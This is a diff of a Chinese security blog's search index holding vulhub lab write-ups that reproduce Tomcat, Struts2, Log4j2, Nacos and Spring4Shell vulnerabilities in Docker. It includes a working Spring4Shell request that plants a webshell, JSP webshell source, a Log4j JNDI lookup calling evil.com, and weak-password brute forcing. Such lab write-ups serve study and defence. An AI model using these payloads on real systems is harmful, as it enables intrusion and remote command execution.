@@ -1,15 +1,46 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>CVE-2018-11776（Struts2 S2-057 远程代码执行漏洞）</title>
+    <title>通过 PUT 方法的 Tomcat 任意写入文件漏洞(CVE-2017-12615)</title>
+    <url>/2022/08/17/CVE-2017-12615%EF%BC%88%E9%80%9A%E8%BF%87%20PUT%20%E6%96%B9%E6%B3%95%E7%9A%84%20Tomcat%20%E4%BB%BB%E6%84%8F%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%EF%BC%89/</url>
+    <content><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>org.apache.jasper.servlet.JspServlet：默认处理jsp，jspx文件请求，不存在PUT上传逻辑，无法处理PUT请求<br>org.apache.catalina.servlets.DefaultServlet：默认处理静态文件（除jsp，jspx之外的文件），存在PUT上传处理逻辑，可以处理PUT请求。<br>所以我们即使可以PUT一个文件到服务器但也无法直接PUT以jsp，jspx结尾文件，因为这些这些后缀的文件都是交由JspServlet处理的，它没法处理PUT请求。<br>但是当我们利用Windows特性以下面两种方式上传文件时，tomcat并不认为其是jsp文件从而交由DefaultServlet处理，从而成功创建jsp文件。</p>
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1.Tomcat 5.X- 9.X</p>
+<p>2.配置文件&#x2F;conf&#x2F;web.xml中readonly&#x3D;false</p>
+<p><img src="/2022/08/17/CVE-2017-12615%EF%BC%88%E9%80%9A%E8%BF%87%20PUT%20%E6%96%B9%E6%B3%95%E7%9A%84%20Tomcat%20%E4%BB%BB%E6%84%8F%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%EF%BC%89/image-20220818093734016.png" alt="image-20220818093734016"></p>
+<h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>攻击机：192.168.129.128_window10</p>
+<p>靶机 ：192.168.129.130_kali</p>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h5><p>在靶机中使用docker搭建</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">docker-compose build #进行编译<br><br>docker-compose up -d #运行靶场<br><br>docker ps #查看容器<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/17/CVE-2017-12615%EF%BC%88%E9%80%9A%E8%BF%87%20PUT%20%E6%96%B9%E6%B3%95%E7%9A%84%20Tomcat%20%E4%BB%BB%E6%84%8F%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%EF%BC%89/image-20220818092525460.png" alt="image-20220818092525460"></p>
+<h5 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h5><p>利用PUT方法上传一句话木马，如何是linux操作系统给后缀后加“&#x2F;”或“20%”，windos系统给后缀添加”::$DATA“进行绕过</p>
+<p>1.”&#x2F;“</p>
+<p><img src="/2022/08/17/CVE-2017-12615%EF%BC%88%E9%80%9A%E8%BF%87%20PUT%20%E6%96%B9%E6%B3%95%E7%9A%84%20Tomcat%20%E4%BB%BB%E6%84%8F%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%EF%BC%89/image-20220818103253553.png" alt="image-20220818103253553"></p>
+<p>2.“20%”</p>
+<p><img src="/2022/08/17/CVE-2017-12615%EF%BC%88%E9%80%9A%E8%BF%87%20PUT%20%E6%96%B9%E6%B3%95%E7%9A%84%20Tomcat%20%E4%BB%BB%E6%84%8F%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%EF%BC%89/image-20220818104946309.png" alt="image-20220818104946309"></p>
+<p>3.”::$DATA“<img src="/2022/08/17/CVE-2017-12615%EF%BC%88%E9%80%9A%E8%BF%87%20PUT%20%E6%96%B9%E6%B3%95%E7%9A%84%20Tomcat%20%E4%BB%BB%E6%84%8F%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%EF%BC%89/image-20220818104853003.png" alt="image-20220818104853003"></p>
+<p>使用蚁剑连接</p>
+<p><img src="/2022/08/17/CVE-2017-12615%EF%BC%88%E9%80%9A%E8%BF%87%20PUT%20%E6%96%B9%E6%B3%95%E7%9A%84%20Tomcat%20%E4%BB%BB%E6%84%8F%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%EF%BC%89/image-20220818104442331.png" alt="image-20220818104442331"></p>
+<p>成功上线</p>
+<p><img src="/2022/08/17/CVE-2017-12615%EF%BC%88%E9%80%9A%E8%BF%87%20PUT%20%E6%96%B9%E6%B3%95%E7%9A%84%20Tomcat%20%E4%BB%BB%E6%84%8F%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%EF%BC%89/image-20220818104404948.png" alt="image-20220818104404948"></p>
+<h5 id="3-关闭环境"><a href="#3-关闭环境" class="headerlink" title="3.关闭环境"></a>3.关闭环境</h5><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">docker-compose down --rmi all -v #关闭并删除环境<br></code></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>vulhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Struts2 S2-057 远程代码执行漏洞(CVE-2018-11776)</title>
     <url>/2022/08/12/CVE-2018-11776%EF%BC%88Struts2%20S2-057%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%89/</url>
     <content><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p> 定义XML配置时如果没有设置namespace的值，并且上层动作配置中并没有设置或使用通配符namespace时，可能会导致远程代码执行漏洞的发生。同样也可能因为url标签没有设置value和action的值，并且上层动作并没有设置或使用通配符namespace，namespace将由用户从uri传入，并作为OGNL表达式计算，最终造成任意命令执行漏洞。</p>
 <h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1.alwaysSelectFullNamespace值为true</p>
 <p>2.action元素未设置namespace属性，或使用了通配符</p>
 <p>3.影响版本:&lt;&#x3D;Struts 2.3.34，Struts 2.5.16</p>
 <p>（比较鸡肋）</p>
-<h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>攻击机：192.168.129.130_window10</p>
-<p>靶机 ：192.168.129.128_kali</p>
+<h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>攻击机：192.168.129.128_window10</p>
+<p>靶机 ：192.168.129.130_kali</p>
 <h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h5><p>在靶机中使用docker搭建</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">docker-compose build #进行编译<br><br>docker-compose up -d #运行靶场<br></code></pre></td></tr></table></figure>
 
@@ -36,7 +67,7 @@
       </tags>
   </entry>
   <entry>
-    <title>CVE-2020-1938（Aapache Tomcat AJP 任意文件读取包含漏洞）</title>
+    <title>Aapache Tomcat AJP 任意文件读取包含漏洞（CVE-2020-1938）</title>
     <url>/2022/08/14/CVE-2020-1938%EF%BC%88Aapache%20Tomcat%20AJP%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%89/</url>
     <content><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Tomcat在默认的conf&#x2F;server.xml中配置了2个Connector，一个默认监听8080端口处理HTTP请求，另外一个默认监听8009端口处理AJP请求，方便与其他Web服务器通过AJP协议进行交互。由于Tomcat AJP协议存在缺陷，致使攻击者可以控制三个参数javax.servlet.include.request_uri、javax.servlet.include.path_info、javax.servlet.include.servlet_path，通过构造特定参数读取webapp目录下的任意文件或包含文件，如：webapp 配置文件或源代码等。</p>
 <h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1.版本为Apache Tomcat 9.x &lt; 9.0.31、8.x &lt; 8.5.51、7.x &lt; 7.0.100、6.x</p>
@@ -89,7 +120,7 @@
       </tags>
   </entry>
   <entry>
-    <title>CVE-2021-29441（Nacos 身份验证绕过）</title>
+    <title>Nacos 身份验证绕过(CVE-2021-29441Nacos)</title>
     <url>/2022/08/15/CVE-2021-29441(Nacos%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87)/</url>
     <content><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。<br>该漏洞发生在nacos在进行认证授权操作时，会判断请求的user-agent是否为”Nacos-Server”，如果是的话则不进行任何认证。开发者原意是用来处理一些服务端对服务端的请求。但是由于配置的过于简单，并且将协商好的user-agent设置为Nacos-Server，直接硬编码在了代码里，导致了漏洞的出现。并且利用这个未授权漏洞，攻击者可以获取到用户名密码等敏感信息。</p>
 <h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1.Nacos &lt;&#x3D; 2.0.0-ALPHA.1</p>
@@ -129,11 +160,11 @@
       </tags>
   </entry>
   <entry>
-    <title>CVE-2021-44228（Apache Log4j2 查找功能 JNDI 注入）</title>
+    <title>Apache Log4j2 查找功能 JNDI 注入(CVE-2021-44228)</title>
     <url>/2022/08/11/CVE-2021-44228%EF%BC%88Apache%20Log4j2%20%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%20JNDI%20%E6%B3%A8%E5%85%A5%EF%BC%89/</url>
     <content><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Apache Log4j 2 是Java语言的日志处理套件，使用极为广泛。在其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于<code>$&#123;jndi:ldap://evil.com/example&#125;</code>的lookup用于进行JNDI注入，执行任意代码。</p>
-<h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>攻击机：192.168.129.130_window10</p>
-<p>靶机 ：192.168.129.128_kali</p>
+<h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>攻击机：192.168.129.128_window10</p>
+<p>靶机 ：192.168.129.130_kali</p>
 <p>JNDIExploit.v1.2：链接: <a href="https://pan.baidu.com/s/1lUcyeU-QlSfCEZI-YU4A-w">https://pan.baidu.com/s/1lUcyeU-QlSfCEZI-YU4A-w</a> 提取码: xiao </p>
 <h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h5><p>在靶机中使用docker搭建</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">docker-compose build #进行编译<br><br>docker-compose up -d #运行靶场<br></code></pre></td></tr></table></figure>
@@ -168,12 +199,12 @@
       </tags>
   </entry>
   <entry>
-    <title>CVE-2022-22965（Spring Framework RCE 通过 JDK 9+ 上的数据绑定）</title>
+    <title>Spring Framework RCE 通过 JDK 9+ 上的数据绑定(CVE-2022-22965)</title>
     <url>/2022/08/16/CVE-2022-22965(Spring%20Framework%20RCE%20%E9%80%9A%E8%BF%87%20JDK%209+%20%E4%B8%8A%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A)/</url>
     <content><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Spring framework 是Spring 里面的一个基础开源框架，其目的是用于简化 Java 企业级应用的开发难度和开发周期，在Spring框架的JDK9版本(及以上版本)中，远程攻击者可在满足特定条件的基础上，通过框架的参数绑定功能获取AccessLogValve对象并诸如恶意字段值，从而触发pipeline机制并写入任意路径下的文件。</p>
 <h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1、JDK9+<br>2、Spring Framework &lt; 5.3.18或Spring Framework &lt; 5.2.20</p>
-<h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>攻击机：192.168.129.130_window10</p>
-<p>靶机 ：192.168.129.128_kali</p>
+<h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>攻击机：192.168.129.128_window10</p>
+<p>靶机 ：192.168.129.130_kali</p>
 <h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h5><p>在靶机中使用docker搭建</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">docker-compose build #进行编译<br><br>docker-compose up -d #运行靶场<br><br>docker ps  #查看容器<br></code></pre></td></tr></table></figure>
 
@@ -184,7 +215,8 @@
 <p>按照以下格式，构造payload</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs url">class.module.classLoader.resources.context.parent.pipeline.first.pattern=    <br>shell代码（需要url编码）<br><br>class.module.classLoader.resources.context.parent.pipeline.first.suffix=<br>修改tomcat日志文件后缀<br><br>class.module.classLoader.resources.context.parent.pipeline.first.directory=<br>写入文件所在的网站根目录<br><br>class.module.classLoader.resources.context.parent.pipeline.first.prefix=<br>写入文件名称<br><br>class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=<br>文件日期格式（实际构造为空值即可）<br></code></pre></td></tr></table></figure>
 
-<p>访问<a href="http://192.168.129.130:8080，并抓包，构造以下pyload，进行重放">http://192.168.129.130:8080，并抓包，构造以下pyload，进行重放</a></p>
+<p>访问<a href="http://192.168.129.130:8080/">http://192.168.129.130:8080</a></p>
+<p>并抓包，构造以下pyload，进行重放</p>
 <figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT/&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=sun&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.129.130:8080<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) 	AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 		Safari/537.36<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">suffix</span><span class="hljs-punctuation">: </span>%&gt;//<br><span class="hljs-attribute">c1</span><span class="hljs-punctuation">: </span>Runtime<br><span class="hljs-attribute">c2</span><span class="hljs-punctuation">: </span>&lt;%<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>0<br></code></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/16/CVE-2022-22965(Spring%20Framework%20RCE%20%E9%80%9A%E8%BF%87%20JDK%209+%20%E4%B8%8A%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A)/image-20220817202902291.png" alt="image-20220817202902291"></p>
@@ -196,6 +228,66 @@
 <p><a href="http://192.168.129.130:8080/sun.jsp?pwd=j&amp;cmd=ls">http://192.168.129.130:8080/sun.jsp?pwd=j&amp;cmd=ls</a></p>
 <p><img src="/2022/08/16/CVE-2022-22965(Spring%20Framework%20RCE%20%E9%80%9A%E8%BF%87%20JDK%209+%20%E4%B8%8A%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A)/image-20220817204341340.png" alt="image-20220817204341340"></p>
 <h5 id="3-关闭环境"><a href="#3-关闭环境" class="headerlink" title="3.关闭环境"></a>3.关闭环境</h5><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">docker-compose down --rmi all -v #关闭并删除环境<br></code></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>vulhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Tomcat7+弱密码&amp;&amp;后端Getshell漏洞</title>
+    <url>/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&amp;&amp;%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>tomcat存在管理后台进行应用部署管理，且管理后台使用HTTP基础认证进行登录。若用户口令为弱口令，攻击者容易进行暴力破解登录后台并进行应用管理。登录成功后有上传点，上传压缩包 xxx.war的.war不会被解析，直接访问 xxx&#x2F;目录下的木马，拿到权限。</p>
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1、tomcat所有版本</p>
+<h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>攻击机：192.168.129.128_window10</p>
+<p>靶机 ：192.168.129.130_kali</p>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h5><p>在靶机中使用docker搭建</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">docker-compose build #进行编译<br><br>docker-compose up -d #运行靶场<br><br>docker ps  #查看容器<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818154809280.png" alt="image-20220818154809280"></p>
+<h5 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h5><p>访问<a href="http://192.168.129.130:8080/">http://192.168.129.130:8080/</a></p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818130507238.png" alt="image-20220818130507238"></p>
+<p>进行登录</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818130634750.png" alt="image-20220818130634750"></p>
+<p>BurpSuitPro抓包</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818130922937.png" alt="image-20220818130922937"></p>
+<p>发现账号密码格式为 base64(账号:密码)</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818131137054.png" alt="image-20220818131137054"></p>
+<p>发到测试器进行爆破</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818131508992.png" alt="image-20220818131508992"></p>
+<p>选择自定义迭代器并导入用户名字典</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818133313901.png" alt="image-20220818133313901"></p>
+<p>导入：</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818133327878.png" alt="image-20220818133327878"></p>
+<p>导入密码字典</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818133338417.png" alt="image-20220818133338417"></p>
+<p>进行base64编码</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818133357998.png" alt="image-20220818133357998"></p>
+<p>url编码这些字符不选</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818135945044.png" alt="image-20220818135945044"></p>
+<p>设置线程，防止被封</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818134605079.png" alt="image-20220818134605079"></p>
+<p>开始测试</p>
+<p>获得弱口令为tomcat:tomcat</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818154626194.png" alt="image-20220818154626194"></p>
+<p>登录后台</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818141322866.png" alt="image-20220818141322866"></p>
+<p>找到上传点</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818141402755.png" alt="image-20220818141402755"></p>
+<p>将jsp木马压缩成zip文件，然后将后缀改为war</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818151948255.png" alt="image-20220818151948255"></p>
+<p>小马代码如下</p>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;sun&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pass&quot;</span>)))&#123;<br>java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream();<br><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br><span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">2048</span>];<br>out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br><span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)&#123;<br>out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(b));<br>&#125;<br>out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>&#125;<br>%&gt;<br></code></pre></td></tr></table></figure>
+
+<p>进行上传</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818152031725.png" alt="image-20220818152031725"></p>
+<p>成功上传，访问<a href="http://192.168.129.130:8080/shell/shell.jsp?pass=666&amp;cmd=pwd">http://192.168.129.130:8080/shell/shell.jsp?pass=666&amp;cmd=pwd</a></p>
+<p>（pass参数为密码，cmd参数为命令)</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818152255496.png" alt="image-20220818152255496"></p>
+<h5 id="关闭环境"><a href="#关闭环境" class="headerlink" title="关闭环境"></a>关闭环境</h5><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">docker-compose down --rmi all -v #关闭并删除环境<br></code></pre></td></tr></table></figure>
+
+]]></content>
       <categories>
         <category>漏洞复现</category>
       </categories>
